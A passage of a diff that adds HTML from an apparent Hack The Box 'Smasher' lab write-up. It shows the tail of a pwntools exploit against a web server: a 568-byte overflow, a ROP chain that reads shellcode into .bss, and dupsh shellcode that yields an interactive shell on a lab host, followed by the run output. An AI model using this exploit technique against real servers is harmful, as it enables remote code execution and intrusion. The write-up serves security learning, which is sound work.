+</span><span class="n">BSS</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">get_section_by_name</span><span class="p">(</span><span class="sh">"</span><span class="s">.bss</span><span class="sh">"</span><span class="p">)[</span><span class="sh">"</span><span class="s">sh_addr</span><span class="sh">"</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">BSS address: {:02x}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">BSS</span><span class="p">))</span>
+<span class="n">read</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">.</span><span class="n">read</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">plt read address: {:02x}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">read</span><span class="p">))</span>
+
+<span class="c1"># Build Payload
+</span><span class="n">junk</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">568</span>                  <span class="c1"># junk
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sh">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x4011dd</span><span class="p">)</span>  <span class="c1"># pop rdi; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>         <span class="c1"># socket descriptor
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x4011db</span><span class="p">)</span>  <span class="c1"># pop rsi; pop r15; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">BSS</span><span class="p">)</span>       <span class="c1"># BSS, to go to rsi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">BSS</span><span class="p">)</span>       <span class="c1"># junk for r15
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>      <span class="c1"># read
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">BSS</span><span class="p">)</span>       <span class="c1"># return to shellcode
+</span><span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">'</span><span class="s">payload: {}</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">urlencode</span><span class="p">(</span><span class="n">junk</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)))</span>
+
+<span class="n">req</span> <span class="o">=</span> <span class="sa">r</span><span class="sh">'</span><span class="s">GET {}</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">urlencode</span><span class="p">(</span><span class="n">junk</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>
+
+<span class="c1"># Send request
+</span><span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">''</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">File not found</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="nf">dupsh</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span> <span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">amd64</span><span class="sh">"</span><span class="p">))</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>And, it gives me a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>python tiny_exploit.py
+<span class="go">[*] BSS address: 603260
+[*] plt read address: 400cf0
+[*] payload: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%dd%11%40%00%00%00%00%00%04%00%00%00%00%00%00%00%db%11%40%00%00%00%00%00%60%32%60%00%00%00%00%00%60%32%60%00%00%00%00%00%f0%0c%40%00%00%00%00%00%60%32%60%00%00%00%00%00
+[+] Opening connection to 10.10.10.89 on port 1111: Done
+[*] Switching to interactive mode
+</span><span class="gp">$ </span><span class="nb">id</span>
+<span class="go">uid=1000(www) gid=1000(www) groups=1000(www)
+</span></code></pre></div></div>
+<div class="PageNavigation">
+<a class="prev" href="/2018/11/24/htb-smasher.html">« HTB: Smasher</a></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2018/11/24/htb-smasher-bof.html"></a>
+</article>
